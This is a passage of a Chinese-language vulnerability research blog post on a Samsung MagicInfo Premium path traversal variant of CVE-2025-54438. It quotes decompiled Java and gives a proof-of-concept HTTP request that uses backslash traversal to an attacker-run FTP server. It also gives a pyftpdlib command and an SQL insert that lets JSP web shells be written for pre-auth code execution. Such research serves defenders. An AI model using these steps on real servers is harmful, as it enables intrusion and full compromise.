StrUtils.nvl(request.getParameter("ftpLoginId")).equals("") ? "" : request.getParameter("ftpLoginId"); // 1 String ftpPassword = StrUtils.nvl(request.getParameter("ftpPassword")).equals("") ? "" : request.getParameter("ftpPassword"); String ftpDirectory = StrUtils.nvl(request.getParameter("ftpDirectory")).equals("") ? "" : request.getParameter("ftpDirectory"); // 2 String ftpRefreshInterval = StrUtils.nvl(request.getParameter("ftpRefreshInterval")).equals("") ? "1" : request.getParameter("ftpRefreshInterval"); long nFtpRefreshInterval = Long.parseLong(ftpRefreshInterval); String canRefresh = StrUtils.nvl(request.getParameter("canRefresh")).equals("") ? "Y" : request.getParameter("canRefresh"); long loginRetryMaxCount = Long.parseLong(StrUtils.nvl(request.getParameter("loginRetryMaxCount")).equals("") ? "1" : request.getParameter("loginRetryMaxCount")); String canLoginRetry = StrUtils.nvl(request.getParameter("canLoginRetry")).equals("") ? "Y" : request.getParameter("canLoginRetry"); String CONTENTS_HOME = CommonConfig.get("CONTENTS_HOME").replace('/', File.separatorChar) + File.separatorChar + "contents_home"; String contentId = UUID.randomUUID().toString().toUpperCase(); this.logger.info("[MagicInfo_FTP_Servlet] " + ftpContentName + ContentUtils.getFolderIp(ftpIP) + portStr + ftpLoginId + ftpPassword + ftpDirectory + ftpRefreshInterval + miUserId + groupId + ", canRefresh[" + canRefresh + "] loginRetryMaxCount[> String localPathByIp = CONTENTS_HOME + File.separator + "FTP_" + ContentUtils.getFolderIp(ftpIP) + '_' + ftpLoginId + '_' + ftpDirectory.replace('/', '_'); // 3 boolean scheduledJob = false; Runnable runFTP = new FtpFileDownloadThread(miUserId, nGroupId, contentId, ftpContentName, ftpIP, port, ftpLoginId, ftpPassword, localPathByIp, ftpDirectory, nFtpRefreshInterval, scheduledJob, canRefresh, loginRetryMaxCount, canLoginRetry); Thread threadFTP = new Thread(runFTP); threadFTP.start(); } catch (Exception e) { response.sendError(600, e.toString()); this.logger.error((Object)e); } }
```  
  
在   
1  
处，代码获取请求参数ftpLoginId  
。此外，  
2  
处的请求参数ftpDirectory  
也会在  
3  
处被用于构造localPathByIp  
。这立刻引起了我的注意，因为这里完全没有 directory traversal 检查！不过看起来有个问题：ftpDirectory  
变量会调用字符串 replace，把所有正斜杠/  
替换成下划线_  
。但我们可以直接用反斜杠\  
！如果攻击者创建一个server  
文件夹并放入一个index.html  
，然后在 Windows（或使用反斜杠的文件系统）上运行python -m pyftpdlib -u user -P pwd -p 2121  
，就可以迫使MagicInfo  
server 下载并再次覆盖index.html  
，从而实现认证绕过！  
  
概念验证：  

```http
GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ftpIp=[attacker]&ftpPort=2121&ftpDirectory=test%5c..%5c..%5c..%5c..%5cserver%5c HTTP/1.1Host: [target]:7002Accept: application/json
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjxKRzUc34gpqynyH9b1iboAt8hv3ibPVs7n0gsLUZdQz61uJmicz4CMOo5VYm9OapAjPAQHOIzp0ibzwUb8tW4FgeD6EVYo5l07fY/640?wx_fmt=png&from=appmsg "Triggering the CVE-2025-54438 variant!")  
  
如果攻击者只是用 ftpLoginId  
来做 traversal，最终会落到类似这样的路径：C:\MagicInfo Premium\runtime\upload\contents_home\FTP_192_168_18_137_user1_  
。末尾多出来的 _  
下划线意味着：我们只能把 html 文件写到 C:/MagicInfo Premium/server/_/  
这个路径里。这个额外的下划线会缓解认证绕过，因为没有任何已登录用户会去访问 /_/index.html  
。  
  
当我们尝试使用 JSP 文件时，它似乎不会被复制过去，因此攻击者无法直接拿到一个 remote code injection primitive。我们来看看为什么它不会处理 JSP 文件。在 com.samsung.magicinfo.protocol.file.FtpGetFiles  
类里可以看到：  

```
 private boolean getFileList() throws IOException, SQLException { FTPFile[] ftpFiles = this.client.listFiles(); // 1 if (ftpFiles == null) { return false; } else { for(FTPFile file : ftpFiles) { if (file.isFile() && !file.isDirectory()) { boolean validType = false; String[] tempName = file.getName().split("[.]"); int sizeOfSplitName = 0; if (tempName.length > 0) { sizeOfSplitName = tempName.length - 1; validType = this.contentInfo.getCodeFile(tempName[sizeOfSplitName].toUpperCase()).equalsIgnoreCase(""); // 2 } if (!validType) { // 3 this.remoteFiles.add(this.makeRemoteFileInfo(file.getName(), file.getSize(), "NONE", "N")); // 4 } } } return true; }
```  
  
在   
1  
处，代码会从远端 FTP server 获取所有文件的列表。对每个文件，它会提取文件扩展名，并在   
2  
处调用 getCodeFile  
。在 com.samsung.magicinfo.framework.content.manager.ContentInfoImpl  
类中：  

```
 public String getCodeFile(String fileType) throws SQLException { return this.dao.getCodeFile(fileType); }
```  
  
然后在 com.samsung.magicinfo.framework.content.dao.ContentDao  
类中：  

```
 public String getCodeFile(String fileType) throws SQLException { Map<String, Object> map = new HashMap(); map.put("fileType", fileType); map.put("ConstMEDIA_TYPE_IMAGE", "IMAGE"); map.put("ConstMEDIA_TYPE_MOVIE", "MOVIE"); map.put("ConstMEDIA_TYPE_FLASH", "FLASH"); map.put("ConstMEDIA_TYPE_OFFICE", "OFFICE"); map.put("ConstMEDIA_TYPE_PDF", "PDF"); List<String> list = ((ContentDaoMapper)this.getMapper()).getCodeFile(map); return list != null && list.size() > 0 ? (String)list.get(0) : ""; }
```  
  
最后在 com.samsung.magicinfo.framework.content.dao.ContentDaoMapper.xml  
文件中：  

```
 <select id="getCodeFile" parameterType="map" resultType="string"> SELECT MEDIA_TYPE FROM MI_CMS_CODE_FILE WHERE (MEDIA_TYPE = #{ConstMEDIA_TYPE_IMAGE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_MOVIE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_FLASH} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_OFFICE} OR MEDIA_TYPE = #{ConstMEDIA_TYPE_PDF}) AND FILE_TYPE = #{fileType} </select>
```  
  
随手做一个数据库查询，可以发现有 52 个 office 扩展名我们没法用来（ab）use 以实现远程代码执行：  

```
SELECT DISTINCT FILE_TYPE FROM MI_CMS_CODE_FILE WHERE (MEDIA_TYPE = 'IMAGE' OR MEDIA_TYPE = 'MOVIE' OR MEDIA_TYPE = 'FLASH' OR MEDIA_TYPE = 'OFFICE' OR MEDIA_TYPE = 'PDF')
```  
  
不过，如果找不到扩展名，代码就会返回空字符串；回到   
2  
后，validType  
会变成 True  
。只有当 validType  
为 False 时，它才会在   
4  
处把远端文件加入列表。我知道，这逻辑又怪又反直觉，对吧 Samsung 开发者！？但我们可以绕过。别忘了我们有任意 SQL 执行的原语！我们只需要执行 insert into mi_cms_code_file values (1337, 'PDF', 'JSP', 'Y');  
，就能随心所欲写 web shell 了！  
## 概念验证（Proof of Concept）  
  
你可以在 这里 下载 poc。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiaW43IOjCUbfPVL7w4gQxLmtib6N8BaPUmF3BRWzHUdZBywhQiaXKIzGicb3u9rqvZHgj6PHtf2sib0wYqMcNYetpu9kHl3Dnp35A8/640?wx_fmt=png&from=appmsg "Getting pre-auth remote code execution")  
## 总结  
  
这几天的 patch review 虽然很"燃"，但也确实让我挖出了更多高危 bug。感谢你一路读到这里；如果你喜欢这类内容，欢迎在 X 上联系我，让我知道这些东西不只是被没有灵魂的 AI 机器吞掉了。  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
